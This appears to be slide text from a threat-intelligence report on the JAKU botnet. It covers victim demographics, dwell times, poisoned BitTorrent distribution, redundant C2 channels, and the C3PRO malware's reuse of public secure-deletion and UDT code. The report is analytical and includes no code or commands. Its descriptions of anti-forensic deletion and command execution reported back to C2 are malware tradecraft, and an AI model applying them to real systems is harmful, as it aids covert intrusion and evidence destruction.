PIRACY, CORPORATE VICTIMS & DWELL TIMES

Software Piracy. Over 50% of the victim computers were found to be running
counterfeit copies of Microsoft Windows.

Corporate Victims Amongst the JAKU victims the number of corporate victims
is significantly low. The proportion of victim computers that are a member of a
Microsoft Windows domain, rather than workgroups or as standalone systems is
less than 1% of all victims. This is calculated on 153 unique victims matching the
corporate criteria.
Dwell Time. The length of time a botnet victim is infected for is referred to as the
dwell time. For those identified as corporate victims the mean dwell time is 93
days with the maximum observed being 348 days. For the non-corporate the
figures vary wildly and in a number of cases the systems appear to be either reinfected or are infected by a number of variants (versions) of the malware.

JAKU – HEADLINES
Piracy. The prevalence of users/victims who are running counterfeit installations
of Microsoft Windows®, downloading ‘warez’ software and using BitTorrent
software to illegally obtain these as well as other copyright protected material,
such as movies and music.

C2 Databases. The use of SQLite files to collate and manage the botnet
members, their structure and the use of version numbering.

Poisoned BitTorrents. The technique of threat actors deploying torrent files
onto torrent sites that are pre-infected with malware has not been widely seen
before, especially with respect to BitTorrent-types of attack. This behaviour is
difficult to trace and track and is indiscriminate in its infection pattern unless it
has some means of targeting desired demographics.
Resilient C2 Channels. Stage two of one piece of malware has three inbuilt
Command and Control (C2) mechanisms. This level of resilience is not
accidental, but rather, such investment and effort is usually indicative of the
perceived value of the target.

High Value Targets. Within the noise of thousands of seemingly indiscriminate
botnet victims, the JAKU campaign performs a separate, highly targeted
operation.

C3PRO – SECURE FILE DELETION (REUSE)
The file deletion routine has been taken and recoded from publicly available
code
Originally written by John Underhill, it was called ‘Secure File Shredder’
The routine used in the malware even contains the same coding errors made,
where file are renamed 780 times (30 * 26) instead of the intended 30

The only difference is that the file truncation is only performed once in the
malware, rather than 10 times as in Underhill's code
The purpose of this code is to prevent advanced forensics techniques from
being able to recover the deleted files
Special Investigations contacted John who we must thank for his cooperation.

Securely delete file (write/read 4 times, rename 900 times, truncate to 0 size, then
delete)
Execute command-line utility (%COMSPEC%) with parameter and send results to C2

C3PRO – UDT LIBRARIES (REUSE)

“UDT is a reliable UDP
based application level
data transport protocol
for distributed data
intensive applications
over wide area highspeed networks. UDT
uses UDP to transfer
bulk data with its own
reliability control and
congestion control
mechanisms. The new
protocol can transfer
data at a much higher
speed than TCP does.
UDT is also a highly
configurable framework
that can accommodate
various congestion
control algorithms.”

The ability for malware to
concurrently support three
separate, custom built C2
channels is more advanced
than the majority of malware
currently observed.

This offers insight into the
amount of effort the malware
author has expended to
ensure that the malware is
stealthy and resilient.
